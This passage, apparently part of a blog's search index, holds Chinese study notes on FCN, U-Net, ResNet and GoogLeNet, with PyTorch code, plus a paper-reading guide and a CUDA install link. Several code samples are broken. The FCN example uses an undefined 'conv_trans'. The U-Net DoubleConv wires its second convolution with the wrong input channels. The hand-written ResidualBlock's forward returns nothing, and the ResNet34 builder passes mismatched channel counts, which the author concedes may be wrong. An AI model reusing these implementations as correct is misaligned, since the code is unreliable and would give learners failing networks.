全景分割：除了目标分割出来，还要把背景分割出来。经典网络有Panoptic FPN ","date":"2022-10-03","objectID":"/fcn%E5%AD%A6%E4%B9%A0/:1:1","tags":["语义分割","FCN","全卷积神经网络"],"title":"FCN学习","uri":"/fcn%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"FCN核心思想 比较简单，其实现存的指明的分类模型都可以转化为FCN模型， 将传统的CNN拿过来，然后将最后的全连接和全局池化层去掉，替换为一个转置卷积层(如果前面卷积层让图片缩小了32倍，这里转置卷积层就放大32倍)，从而实现每个像素的预测 （输出空间映射而不是分类的分数） 其中通道数就是类别的个数+1，当前前面可以加一个1x1卷积来降低运算量(降低维度) 全卷积⽹络先使⽤卷积神经⽹络抽取图像特征，然后通过1×1卷积层将通道数变换为类别个数，最后通过转置卷积层将特征图的⾼和宽变换为输⼊图像的尺⼨。 ","date":"2022-10-03","objectID":"/fcn%E5%AD%A6%E4%B9%A0/:1:2","tags":["语义分割","FCN","全卷积神经网络"],"title":"FCN学习","uri":"/fcn%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"FCN网络架构 大致步骤： 将一个用于分类的卷积网络（比如VGG16, VGG系列对于提取特征十分有效）转换为全卷积的，也就是将全连接层进行卷积化，得到一个热图（heatmap） 通过上采样将热图恢复到输入图片的尺寸得到pixelwise predictions。然后以最大概率为依据逐个像素进行分类。loss就是所有像素上的softmax loss之和。 添加skip connections来将浅层精细的语义信息和深层粗糙的语义信息融合起来。也就是解决上面提到的“位置和语义的tension” FCN正向编码网络结构： FCN反向编码网络结构： ","date":"2022-10-03","objectID":"/fcn%E5%AD%A6%E4%B9%A0/:1:3","tags":["语义分割","FCN","全卷积神经网络"],"title":"FCN学习","uri":"/fcn%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"FCN-32s ","date":"2022-10-03","objectID":"/fcn%E5%AD%A6%E4%B9%A0/:1:4","tags":["语义分割","FCN","全卷积神经网络"],"title":"FCN学习","uri":"/fcn%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"FCN-16s ","date":"2022-10-03","objectID":"/fcn%E5%AD%A6%E4%B9%A0/:1:5","tags":["语义分割","FCN","全卷积神经网络"],"title":"FCN学习","uri":"/fcn%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"FCN-8s ","date":"2022-10-03","objectID":"/fcn%E5%AD%A6%E4%B9%A0/:1:6","tags":["语义分割","FCN","全卷积神经网络"],"title":"FCN学习","uri":"/fcn%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"代码实现举例 # 输出的类别预测与输⼊图像在像素级别上具有⼀⼀对应关系：通道维的输出即该位置对应像素的类别预测。 %matplotlib inline import torch import torchvision from torch import nn from torch.nn import functional as F from d2l import torch as d2l # 我 们 使 ⽤ 在ImageNet数 据 集 上 预 训 练 的ResNet-18模 型 来 提 取 图 像 特 征， 并 将 该 ⽹ 络 记为pretrained_net。ResNet-18模型的最后⼏层包括全局平均汇聚层和全连接层，然⽽全卷积⽹络中不需要它们。 pretrained_net = torchvision.models.resnet18(pretrained=True) list(pretrained_net.children())[-3:] # 接下来，我们创建⼀个全卷积⽹络net。它复制了ResNet-18中⼤部分的预训练层，去除了最后的全局平均汇聚层和最接近输出的全连接层。 net = nn.Sequential(*list(pretrained_net.children())[:-2]) # 接下来，我们使⽤1 × 1卷积层将输出通道数转换为Pascal VOC2012数据集的类数（21类）。最后，我们需要将 # 特征图的⾼度和宽度增加32倍，从⽽将其变回输⼊图像的⾼和宽。 num_classes = 21 net.add_module('final_conv', nn.Conv2d(512, num_classes, kernel_size=1)) net.add_module('transpose_conv', nn.ConvTranspose2d(num_classes, num_classes, kernel_size=64, padding=16, stride=32)) # 这里的转置卷积：一般卷积下采样多少，我们转置卷积就上采样多少 # 我们可以看到如果步幅为s，填充为s/2（假设s/2是整数）且卷积核的⾼和宽为2s，转置卷积核会将输⼊的⾼和宽分别放⼤s倍 # 初始化转置卷积层，双线性插值的上采样可以通过转置卷积层实现 def bilinear_kernel(in_channels, out_channels, kernel_size): factor = (kernel_size + 1) // 2 if kernel_size % 2 == 1: center = factor - 1 else: center = factor - 0.5 og = (torch.arange(kernel_size).reshape(-1, 1), torch.arange(kernel_size).reshape(1, -1)) filt = (1 - torch.abs(og[0] - center) / factor) * (1 - torch.abs(og[1] - center) / factor) weight = torch.zeros((in_channels, out_channels, kernel_size, kernel_size)) weight[range(in_channels), range(out_channels), :, :] = filt return weight # 读取图像X，将上采样的结果记作Y。为了打印图像，我们需要调整通道维的位置。 img = torchvision.transforms.ToTensor()(d2l.Image.open('../img/catdog.jpg')) X = img.unsqueeze(0) Y = conv_trans(X) out_img = Y[0].permute(1, 2, 0).detach() d2l.set_figsize() print('input image shape:', img.permute(1, 2, 0).shape) d2l.plt.imshow(img.permute(1, 2, 0)); print('output image shape:', out_img.shape) d2l.plt.imshow(out_img); # 在全卷积⽹络中，我们⽤双线性插值的上采样初始化转置卷积层。对于1 × 1卷积层，我们使⽤Xavier初始化参数。 # W = bilinear_kernel(num_classes, num_classe, 64) # net.transpose_conv.weight.data.copy_(W); # 读取数据集 batch_size, crop_size = 32, (320, 480) train_iter, test_iter = d2l.load_data_voc(batch_size, crop_size) # 训练 def loss(inputs, targets): return F.cross_entropy(inputs, targets, reduction='none').mean(1).mean(1) num_epochs, lr, wd, devices = 5, 0.001, 1e-3, d2l.try_all_gpus() trainer = torch.optim.SGD(net.parameters(), lr=lr, weight_decay=wd) d2l.train_ch13(net, train_iter, test_iter, loss, trainer, num_epochs, devices) # 预测 def predict(img): X = test_iter.dataset.normalize_image(img).unsqueeze(0) pred = net(X.to(devices[0])).argmax(dim=1) return pred.reshape(pred.shape[1], pred.shape[2]) def label2image(pred): colormap = torch.tensor(d2l.VOC_COLORMAP, device=devices[0]) X = pred.long() return colormap[X, :] voc_dir = d2l.download_extract('voc2012', 'VOCdevkit/VOC2012') test_images, test_labels = d2l.read_voc_images(voc_dir, False) n, imgs = 4, [] for i in range(n): crop_rect = (0, 0, 320, 480) X = torchvision.transforms.functional.crop(test_images[i], *crop_rect) pred = label2image(predict(X)) imgs += [X.permute(1,2,0), pred.cpu(), torchvision.transforms.functional.crop( test_labels[i], *crop_rect).permute(1,2,0)] d2l.show_images(imgs[::3] + imgs[1::3] + imgs[2::3], 3, n, scale=2); ","date":"2022-10-03","objectID":"/fcn%E5%AD%A6%E4%B9%A0/:2:0","tags":["语义分割","FCN","全卷积神经网络"],"title":"FCN学习","uri":"/fcn%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"Note backbone：骨干网络，意指特征提取网络，一般就是使用vgg, resnett,mobilenet是常用的，可以说目标识别网络softmax之前的部分都以用来作为backbone Bottleneck(瓶颈) ","date":"2022-10-03","objectID":"/fcn%E5%AD%A6%E4%B9%A0/:3:0","tags":["语义分割","FCN","全卷积神经网络"],"title":"FCN学习","uri":"/fcn%E5%AD%A6%E4%B9%A0/"},{"categories":null,"content":" 之前网上找了好多教程，导致我把无线网卡都卸载了….，然后发现这篇不错的文章，直接贴出这篇教程ubuntu安装cuda(这个真不踩坑的教程)：https://blog.csdn.net/weixin_43744613/article/details/124272020 ","date":"2022-09-24","objectID":"/ubuntu%E5%AE%89%E8%A3%85cuda/:0:0","tags":null,"title":"Ubuntu安装cuda","uri":"/ubuntu%E5%AE%89%E8%A3%85cuda/"},{"categories":["AI"],"content":" 文献地址：https://arxiv.org/pdf/1505.04597v1.pdf ","date":"2022-09-21","objectID":"/u-net%E5%AD%A6%E4%B9%A0/:0:0","tags":["unet","CNN"],"title":"U-Net学习","uri":"/u-net%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"简介\u0026网络结构 UNet是医学分割领域经典论文，其结构与字母U类似而得名，是一个Encoder-Decoder结构，可以看到下图，左侧是Encoder部分(下采样，特征提取,缩小图片尺寸)，右侧是Decoder部分(上采样,扩大图片尺寸)。 说明几点先： 下采样过程中，特征图缩小的尺寸是上一层的一半；而在上采样过程中特征图变为上一层的一倍。通道数量变化相反 下采样的时候卷积层特征尺寸变化小，原论文使用max pooling进行尺度缩小；上采样也一样，使用upsampling+conv进行尺度增大。 然后，结构图中的灰色箭头(copy and crop)目的是将浅层特征与深层特征融合(其实就是使用cat进行拼接)，这样可以既保留浅层特征图中较高精度的特征信息，也可以利用深层特征图中抽象的语义信息。（左边的特征层(浅层特征)进行中心裁剪拼接到右边(深层特征)） 但是现在主流的实现方式并不是按照原论文实现的，而主流的实现方式是： 在3x3的卷积层加上一个padding(也就是每次经过这个3x3的卷积层的时候不会去改变特征层的高和宽) 在卷积和ReLU之间加BatchNormalization 这么做的好处： 假设是到上采样的时候，加上padding之后的形状不变，和左边是一样的，就不需要进行中心裁剪(仔细观察网络图可以发现)，直接进行拼接： 另一个注意点： 如果按照原论文给的网络，假设给出下图左边的区域，得到的只有右边的区域。原作者对于边缘位置损失像素的区域进行了镜像： 但是如果按照上面那种大小不变的情况，就不会出现边缘缺失数据的情况，当然也不会使用下面的overlap了 为了得到好的效果(推荐做法)： 对于大的高分辨率的影像，一般不整个放进去，而是分割开放进去，每个区域之间有一个overlap重叠区域，来得到较好效果： 再一个注意点： 语义分割，一般我们使用c作为GT，也就是前景色和背景色 细胞细胞之间不容易分割，所以细胞之间的背景区域分给更大的权重(右边图d有个热力图，红色代表权重越大)，损失的权重也更大一些；其他大面积的背景区域分配较小的权重 ","date":"2022-09-21","objectID":"/u-net%E5%AD%A6%E4%B9%A0/:1:0","tags":["unet","CNN"],"title":"U-Net学习","uri":"/u-net%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"实现细节 import torch as t from torch import nn ## 下采样的基本结构 # 参考：https://github.com/JavisPeng/u_net_liver/blob/a1b9553d8ba8c6e5a3d4c5fabd387e130e60a072/dataset.py#L16 # 常用的两个卷积操作简单封装 class DoubleConv(nn.Module): def __init__(self, in_ch, out_ch): super().__init__() self.conv_down = nn.Sequential( # 主流实现方式 # - 在3x3的卷积层加上一个padding(也就是每次经过这个3x3的卷积层的时候不会去改变特征层的高和宽) # - 在卷积核ReLU之间加BatchNormalization nn.Conv2d(in_ch, out_ch, 3, padding=1), nn.BatchNorm2d(out_ch), nn.ReLU(inplace=True), nn.Conv2d(in_ch, out_ch, 3, padding=1), nn.BatchNorm2d(out_ch), nn.ReLU(inplace=True), ) def forward(self, input): return self.conv_down(input) # U-Net网络 class Unet(nn.Module): def __init__(self, in_ch, out_ch): super().__init__() # 下采样 self.conv1 = DoubleConv(in_ch, 64) self.pool1 = nn.MaxPool2d(2) self.conv2 = DoubleConv(64, 128) self.pool2 = nn.MaxPool2d(2) self.conv3 = DoubleConv(128, 256) self.pool3 = nn.MaxPool2d(2) self.conv4 = DoubleConv(256, 512) self.pool4 = nn.MaxPool2d(2) self.conv5 = DoubleConv(512, 1024) # 上采样 # 转置卷积(有参数可以训练)可以实现上采样，也可以使用Upsample上采样(通过插值完成，没有训练参数，速度更快)(保证k=stride,stride即上采样倍数) self.up6 = nn.ConvTranspose2d(1024, 512, 2, stride=2) self.conv6 = DoubleConv(1024, 512) self.up7 = nn.ConvTranspose2d(512, 256, 2, stride=2) self.conv7 = DoubleConv(512, 256) self.up8 = nn.ConvTranspose2d(256, 128, 2, stride=2) self.conv8 = DoubleConv(256, 128) self.up9 = nn.ConvTranspose2d(128, 64, 2, stride=2) self.conv9 = DoubleConv(128, 64) self.conv10 = nn.Conv2d(64, out_ch, 1) def forward(self, x): c1 = self.conv1(x) p1 = self.pool1(c1) c2 = self.conv2(p1) p2 = self.pool2(c2) c3 = self.conv3(p2) p3 = self.pool3(c3) c4 = self.conv4(p3) p4 = self.pool4(c4) c5 = self.conv5(p4) up_6 = self.up6(c5) merge6 = t.cat([up_6, c4], dim=1) # cat 拼接 c6 = self.conv6(merge6) # 对拼接之后的继续向上进行卷积 up_7 = self.up7(c6) merge7 = t.cat([up_7, c3], dim=1) c7 = self.conv7(merge7) up_8 = self.up8(c7) merge8 = t.cat([up_8, c2], dim=1) c8 = self.conv8(merge8) up_9 = self.up9(c8) merge9 = t.cat([up_9, c1], dim=1) c9 = self.conv9(merge9) c10 = self.conv10(c9) out = nn.Sigmoid()(c10) return out 看一下： unet = Unet(1,10) print(unet) ","date":"2022-09-21","objectID":"/u-net%E5%AD%A6%E4%B9%A0/:2:0","tags":["unet","CNN"],"title":"U-Net学习","uri":"/u-net%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"ResNet ResNet沿用了VGG全3×3卷积层的设计。残差块里首先有2个有相同输出通道数的3×3卷积层。每个卷积层后接一个批量归一化层和ReLU激活函数。然后我们将输入跳过这两个卷积运算后直接加在最后的ReLU激活函数前。这样的设计要求两个卷积层的输出与输入形状一样，从而可以相加。如果想改变通道数，就需要引入一个额外的1×1卷积层来将输入变换成需要的形状后再做相加运算。 ","date":"2022-09-20","objectID":"/resnet/:1:0","tags":["ResNet","残差网络","CNN"],"title":"ResNet","uri":"/resnet/"},{"categories":["AI"],"content":"残差块 论文中的图： 1.恒等映射: 上图中有一个曲线，称为shortcut connection(快捷连接），就是恒等映射。既不增加额外参数，也不增加计算复杂度。而恒等映射表示：输入=输出； 2.图中F（x）的作用： 图中F（x）执行卷积操作，目的是提取图片中的更多特征，或者是其它层没有学习的特征； 理解： 残差网络提出的目的就是为了减少梯度消失，更多的提取特征。 假设我们输出目标是H(x),通过上图操作，实际输出是F（x）+x，因此F（x）=H(x)-x就是我们的目标残差。换个角度思考，假设网络模型优化的很好，通过卷积和池化已经提取不了特征，那么网络中F（x）=0，则残差块输入等于输出，这时候就变成恒等映射。很多利用残差块叠加深层神经网络，即使层数很多，但是运行时间没有很大提升，这是因为前面的残差块已经提出足够的特征，后面的残差块没有特征提取变成恒等映射，故网络模型运行时间没有显著提升。 通过优化使H（x）-x=F（x）无限逼近于0，当F（x）已经成为0时，后续操作无须进行，跳过执行，降低复杂度（恒等映射）。 ## 残差块的实现 import time import torch from torch import nn, optim import torch.nn.functional as F from d2l import d2ltorch as d2l device = torch.device('cuda' if torch.cuda.is_available() else 'cpu') # 第一步：定义残差块 class Residual(nn.Module): def __init__(self, in_channels, out_channels, use_1x1conv=False, stride=1): super(Residual, self).__init__() self.conv1 = nn.Conv2d(in_channels, out_channels, kernel_size=3, padding=1, stride=stride) self.conv2 = nn.Conv2d(out_channels, out_channels, kernel_size=3, padding=1) if use_1x1conv: self.conv3 = nn.Conv2d(in_channels, out_channels, kernel_size=1, stride=stride) else: self.conv3 = None self.bn1 = nn.BatchNorm2d(out_channels) self.bn2 = nn.BatchNorm2d(out_channels) self.relu = nn.ReLU(inplace=True) def forward(self, X): Y = F.relu(self.bn1(self.conv1(X))) Y = self.bn2(self.conv2(Y)) if self.conv3: X = self.conv3(X) return F.relu(Y + X) ","date":"2022-09-20","objectID":"/resnet/:2:0","tags":["ResNet","残差网络","CNN"],"title":"ResNet","uri":"/resnet/"},{"categories":["AI"],"content":"残差网络 ResNet的前两层跟之前介绍的GoogLeNet中的一样： 在输出通道数为64、步幅为2的7×7卷积层后接步幅为2的3×3的最大池化层。 不同之处在于ResNet每个卷积层后增加的批量归一化层。 GoogLeNet在后面接了4个由Inception块组成的模块。ResNet则使用4个由残差块组成的模块，每个模块使用若干个同样输出通道数的残差块。 第一个模块的通道数同输入通道数一致。由于之前已经使用了步幅为2的最大池化层，所以无须减小高和宽。 之后的每个模块在第一个残差块里将上一个模块的通道数翻倍，并将高和宽减半。 ResNet架构： 一般就用ResNet-34比较多(34个卷积层)或者50，很少用特别大的 # 最前面跟GoogleNet的b1是一样的 net = nn.Sequential( nn.Conv2d(1, 64, kernel_size=7, stride=2, padding=3), nn.BatchNorm2d(64), nn.ReLU(), nn.MaxPool2d(kernel_size=3, stride=2, padding=1)) def resnet_block(in_channels, out_channels, num_residuals, first_block=False): if first_block: # 第一个要特殊处理 assert in_channels == out_channels # 第一个模块的通道数同输入通道数一致 blk = [] for i in range(num_residuals): # 需要注意first_block已经做了3*3的最大池化，所以没必要做变换.第二层，第三层，第四层跳跃连接时，维度不同，需要先经过1*1卷积变换再相加。 if i == 0 and not first_block: # 每一个block有2个esidual，每一个Residual有2个卷积层 blk.append(Residual(in_channels, out_channels, use_1x1conv=True, stride=2)) # 减半 else: blk.append(Residual(out_channels, out_channels)) return nn.Sequential(*blk) # 为ResNet加入所有残差块 net.add_module(\"resnet_block1\", resnet_block(64, 64, 3, first_block=True)) # 第一个高宽不变 net.add_module(\"resnet_block2\", resnet_block(64, 128, 4)) # 下面三个：重复两个block，通道数加倍，高宽减半 net.add_module(\"resnet_block3\", resnet_block(128, 256, 6)) # 自己可以设置每个里面有多少个block，这里设置的是2 net.add_module(\"resnet_block4\", resnet_block(256, 512, 3)) # 最后，与GoogLeNet一样，加入全局平均池化层后接上全连接层输出。 net.add_module(\"global_avg_pool\", nn.AdaptiveAvgPool2d((1,1))) # GlobalAvgPool2d的输出: (Batch, 512, 1, 1) net.add_module(\"fc\", nn.Sequential(nn.Flatten(), nn.Linear(512, 10))) # 展开，全连接层 # 这里每个模块里有4个卷积层（不计算1×11×1卷积层）， # 加上最开始的卷积层和最后的全连接层，共计18层。 # 这个模型通常也被称为ResNet-18 # 通过配置不同的通道数和模块里的残差块数可以得到不同的ResNet模型，例如更深的含152层的ResNet-152 # 来观察一下输入形状在ResNet不同模块之间的变化。 X = torch.rand((1, 1, 224, 224)) for name, layer in net.named_children(): X = layer(X) print(name, ' output shape:\\t', X.shape) \"\"\" 0 output shape: torch.Size([1, 64, 112, 112]) 1 output shape: torch.Size([1, 64, 112, 112]) 2 output shape: torch.Size([1, 64, 112, 112]) 3 output shape: torch.Size([1, 64, 56, 56]) resnet_block1 output shape: torch.Size([1, 64, 56, 56]) resnet_block2 output shape: torch.Size([1, 128, 28, 28]) resnet_block3 output shape: torch.Size([1, 256, 14, 14]) resnet_block4 output shape: torch.Size([1, 512, 7, 7]) global_avg_pool output shape: torch.Size([1, 512, 1, 1]) fc output shape: torch.Size([1, 10]) \"\"\" 训练： lr, num_epochs, batch_size = 0.001, 5, 256 # 调用沐神的第三放包里的训练和加载数据的方法 train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, resize=96) optimizer = torch.optim.Adam(net.parameters(), lr=lr) d2l.train_ch5(net, train_iter, test_iter, batch_size, optimizer, device, num_epochs) ","date":"2022-09-20","objectID":"/resnet/:3:0","tags":["ResNet","残差网络","CNN"],"title":"ResNet","uri":"/resnet/"},{"categories":["AI"],"content":"使用nn.module实现 不知道对不对 import time import torch from torch import nn, optim import torch.nn.functional as F # 残差块 class ResidualBlock(nn.Module): def __init__(self,inchanel,outchanel,stride=1,shortcut=None): super(ResidualBlock,self).__init__() self.left=nn.Sequential( nn.Conv2d(inchanel,outchanel,3,stride,1,bias=False), nn.BatchNorm2d(outchanel), nn.ReLU(inplace=True), nn.Conv2d(outchanel,outchanel,3,1,1,bias=False), nn.BatchNorm2d(outchanel) ) self.right=shortcut def forward(self, x): out=self.left(x) residual = x if self.right is None else self.right(x) out += residual class ResNet34(nn.Module): \"\"\" 实现主module:ResNet34 ResNet34包含多个layer，每个layer又包含多个residual block 用子model实现residual block，用__make_layer__函数实现layer \"\"\" def __init__(self,num_classes=10): \"\"\" 构建ResNet34网络的各层结构 :param num_classes: \"\"\" super(ResNet34,self).__init__() self.pre=nn.Sequential( nn.Conv2d(1, 64, kernel_size=7, stride=2, padding=3), nn.BatchNorm2d(64), nn.ReLU(inplace=True), nn.MaxPool2d(kernel_size=3, stride=2, padding=1) ) self.layer1 = self.__make_layer__(64,128,3,stride=1, is_short=False) self.layer2 = self.__make_layer__(128,256,4,stride=2) self.layer3 = self.__make_layer__(256,512,6,stride=2) self.layer4 = self.__make_layer__(512,512,3,stride=2) self.fc = nn.Linear(512,num_classes) def __make_layer__(self,inchannel,outchannel,block_num,stride=1, is_short=True): \"\"\" 构建layer，包含多个residual block \"\"\" if is_short: shortcut = nn.Sequential( nn.Conv2d(inchannel,outchannel,1,stride,bias=False), nn.BatchNorm2d(outchannel) ) else: shortcut = None layers = [] layers.append(ResidualBlock(inchannel,outchannel,stride,shortcut)) for i in range(1,block_num): layers.append(ResidualBlock(inchannel,outchannel)) return nn.Sequential(*layers) def forward(self, x): x = self.pre(x) x = self.layer1(x) x = self.layer2(x) x = self.layer3(x) x = self.layer4(x) x = F.avg_pool2d(x,7) x = x.view(x.size(0),-1) return self.fc(x) model = ResNet34() print(model) ","date":"2022-09-20","objectID":"/resnet/:4:0","tags":["ResNet","残差网络","CNN"],"title":"ResNet","uri":"/resnet/"},{"categories":["科研"],"content":" 一般论文的结构： 1.title 2.abstract 3.introduction 4.method 5.exp 6.conclusuin 三遍读论文： 部分 第一遍 第二遍 第三遍 1.title 1.标题：看一下是否与自己相关 对文章整个过一遍，知道每一块在干什么东西。沿着标题读到最后：公式和细节可以忽略；主要是图和表要看明白 最详细的一遍。关键：要知道每句话和每段话在做什么 ，能够从大脑中脑补他的过程，就好像自己做了一遍一样 2.abstract 2.摘要：看一眼摘要–论文在做什么 3.introduction 相关问题圈出来，比如\"我们在做某个问题,是xxx之前提出了来的，是在xxx的方法上改进的\"，发现其中的文献没读过的可以圈出来 4.method 4.也可以瞄一下方法里面的图和表看看他在干什么 比如方法中的流程图、算法的图长什么样子 5.experiments 4.可以看一眼实验部分的图和表 比如实验里面的图的x轴y轴和点是什么意思，作者提出的方法和别人的方法是怎么对比的以及差距有多大 在脑子里面不断重复(比如\"作者用xxx实现了xxx\"，如果让我来做我会怎么走，可以用xxx来实现这个东西；作者在做实验的时候，想一想如果换我来做的话我会怎么做，会不会比他更好 6.conclusuin 3.结论：跟摘要是类似的，把摘要里的问题解决了。读完这三部分，现在就大概知道这篇论文大概在讲什么东西 或者作者说了文章某些地方没有往下走，你要想如果换我来的话是不是能够往前走呢？ 第一遍花费大约十几分钟时间，就可以了解这篇文章在讲什么，文章质量，方法怎么样，结果怎么样，适不适合自己—\u003e再觉得继续读or放一边 读完第二遍，决定要不要继续往下精读。 如果感觉太难了读不懂，可以读他引用的文章，再回来读。 如果觉得自己不需要了解那么深入，跟自己的方向不一样，知道他就行了，就不用读了 然后关上文章，也能大概回忆出很多细节部分 ","date":"2022-09-17","objectID":"/%E6%B2%90%E7%A5%9E%E6%95%99%E4%BD%A0%E4%B8%89%E6%AD%A5%E8%AF%BB%E8%AE%BA%E6%96%87/:0:0","tags":["文献阅读"],"title":"沐神教你三步读论文","uri":"/%E6%B2%90%E7%A5%9E%E6%95%99%E4%BD%A0%E4%B8%89%E6%AD%A5%E8%AF%BB%E8%AE%BA%E6%96%87/"},{"categories":["AI"],"content":" 2014年提出 GoogLeNet吸收了NiN中网络串联网络的思想，并在此基础上做了很大改进。在随后的几年里，研究人员对GoogLeNet进行了数次改进，这里将介绍这个模型系列的第一个版本。 ","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C4-%E5%90%AB%E5%B9%B6%E8%A1%8C%E8%BF%9E%E7%BB%93%E7%9A%84%E7%BD%91%E7%BB%9C-googlenet/:0:0","tags":["GoogLeNet"],"title":"经典现代卷积网络4-含并行连结的网络(GoogLeNet)","uri":"/%E7%BB%8F%E5%85%B8%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C4-%E5%90%AB%E5%B9%B6%E8%A1%8C%E8%BF%9E%E7%BB%93%E7%9A%84%E7%BD%91%E7%BB%9C-googlenet/"},{"categories":["AI"],"content":"Inception块 GoogLeNet中的基础卷积块叫作Inception块 4个路径从不同层面抽取信息，然后再输出通道维合并 提供了4条路径（四种方法），输入输出等同高宽，然后作为不同的通道叠加 每个路径输出的通道数，可以自己来决定，相当于通过通道数来给每个路径分配权重 至于为什么给每个通道分配这些数量，玄学吧？反正作者没解释过 inception块相比3X3和5x5卷积层有更少的参数和计算复杂度 跟单3x3或5x5卷积层相比，Inception块有更少的参数个数和计算复杂度 Inception后续有很多变种 Inception块： import torch from torch import nn from torch.nn import functional as F from d2l import d2ltorch as d2l class Inception(nn.Module): # `c1`--`c4` 是每条路径的输出通道数 def __init__(self,in_channels,c1,c2,c3,c4,**kwargs): super(Inception,self).__init__(**kwargs) # 线路1，单1 x 1卷积层 self.p1_1 = nn.Conv2d(in_channels, c1, kernel_size=1) # 线路2，1 x 1卷积层后接3 x 3卷积层 self.p2_1 = nn.Conv2d(in_channels,c2[0],kernel_size=1) self.p2_2 = nn.Conv2d(c2[0],c2[1],kernel_size=3,padding=1) # 线路3，1 x 1卷积层后接5 x 5卷积层 self.p3_1 = nn.Conv2d(in_channels,c3[0],kernel_size=1) self.p3_2 = nn.Conv2d(c3[0],c3[1],kernel_size=5,padding=2) # 线路4，3 x 3最⼤汇聚层后接1 x 1卷积层 self.p4_1 = nn.MaxPool2d(kernel_size=3,stride=1,padding=1) self.p4_2 = nn.Conv2d(in_channels,c4,kernel_size=1) def forward(self,x): p1_1 = F.relu(self.p1_1(x)) p2_1 = F.relu(self.p2_1(x)) p2_2 = F.relu(self.p2_2(p2_1)) p3_1 = F.relu(self.p3_1(x)) p3_2 = F.relu(self.p3_2(p3_1)) p4_1 = F.relu(self.p4_1(x)) p4_2 = F.relu(self.p4_2(p4_1)) p1,p2,p3,p4 = p1_1,p2_2,p3_2,p4_2 # 在通道维度上连结输出 return torch.cat((p1, p2, p3, p4), dim=1) ","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C4-%E5%90%AB%E5%B9%B6%E8%A1%8C%E8%BF%9E%E7%BB%93%E7%9A%84%E7%BD%91%E7%BB%9C-googlenet/:1:0","tags":["GoogLeNet"],"title":"经典现代卷积网络4-含并行连结的网络(GoogLeNet)","uri":"/%E7%BB%8F%E5%85%B8%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C4-%E5%90%AB%E5%B9%B6%E8%A1%8C%E8%BF%9E%E7%BB%93%E7%9A%84%E7%BD%91%E7%BB%9C-googlenet/"},{"categories":["AI"],"content":"模型 GoogLeNet ⼀共使⽤9个Inception块和全局平均汇聚层的堆叠来⽣成其估计值。 Inception块 之间的最⼤汇聚层可降低维度。 第⼀个模块类似于AlexNet 和LeNet，Inception块的栈从VGG继承，全局平 均汇聚层避免了在最后使⽤全连接层。 GoogLeNet结构 多个inception块叠加（一个stage一般意味着高宽减半操作： 下面是详细讨论每个stage： # 接下来我们自己动手实现这个网络 # 第⼀个模块使⽤64个通道,7X7卷积层 b1 = nn.Sequential( nn.Conv2d(1,64,kernel_size=7,padding=3,stride=2), nn.ReLU(), nn.MaxPool2d(kernel_size=3,padding=1,stride=2) ) b2 = nn.Sequential( nn.Conv2d(64,64,kernel_size=1), nn.ReLU(), nn.Conv2d(64,192,kernel_size=3,padding=1), nn.MaxPool2d(kernel_size=3,padding=1,stride=2) ) # stage3开始就要使用inception块了 b3 = nn.Sequential( # 输入192 输出 64 + 128 + 32 + 32 = 256 Inception(in_channels= 192,c1 = 64,c2=(96,128),c3=(16,32),c4=32), # 输出为 128 + 192+ 96+ 64 = 480 Inception(256, 128, (128, 192), (32, 96), 64), nn.MaxPool2d(kernel_size=3,padding=1,stride=2) ) # stage4 stage3能写出来，4就照样做就可以了 b4 = nn.Sequential( Inception(480, 192, (96, 208), (16, 48), 64), Inception(512, 160, (112, 224), (24, 64), 64), Inception(512, 128, (128, 256), (24, 64), 64), Inception(512, 112, (144, 288), (32, 64), 64), Inception(528, 256, (160, 320), (32, 128), 128), nn.MaxPool2d(kernel_size=3, stride=2, padding=1) ) # stage5是输出层 b5 = nn.Sequential( Inception(832, 256, (160, 320), (32, 128), 128), Inception(832, 384, (192, 384), (48, 128), 128), # 自适应平均池化层, 能够自动选择步幅和填充，比较方便 nn.AdaptiveAvgPool2d((1,1)), nn.Flatten() ) # 这里b1-b5都是nn.Sequential，但是好像可以直接嵌套进新的nn.Sequential net = nn.Sequential(b1, b2, b3, b4, b5, nn.Linear(1024, 10)) # 这里输入不是224X224，改为96X96，加快训练速度 X = torch.rand(size=(1, 1, 96, 96)) for layer in net: X = layer(X) print(layer.__class__.__name__,'output shape:\\t', X.shape) lr, num_epochs, batch_size = 0.1, 10, 128 train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, resize=96) d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu()) 可以看出来，我已经在堆文字了…..确实学不下去了，改天再回来继续认真看…… ","date":"2022-09-15","objectID":"/%E7%BB%8F%E5%85%B8%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C4-%E5%90%AB%E5%B9%B6%E8%A1%8C%E8%BF%9E%E7%BB%93%E7%9A%84%E7%BD%91%E7%BB%9C-googlenet/:2:0","tags":["GoogLeNet"],"title":"经典现代卷积网络4-含并行连结的网络(GoogLeNet)","uri":"/%E7%BB%8F%E5%85%B8%E7%8E%B0%E4%BB%A3%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C4-%E5%90%AB%E5%B9%B6%E8%A1%8C%E8%BF%9E%E7%BB%93%E7%9A%84%E7%BD%91%E7%BB%9C-googlenet/"},{"categories":["AI"],"content":" 前几节介绍的LeNet、AlexNet和VGG在设计上的共同之处是：先以由卷积层构成的模块充分抽取空间特征，再以由全连接层构成的模块来输出分类结果。 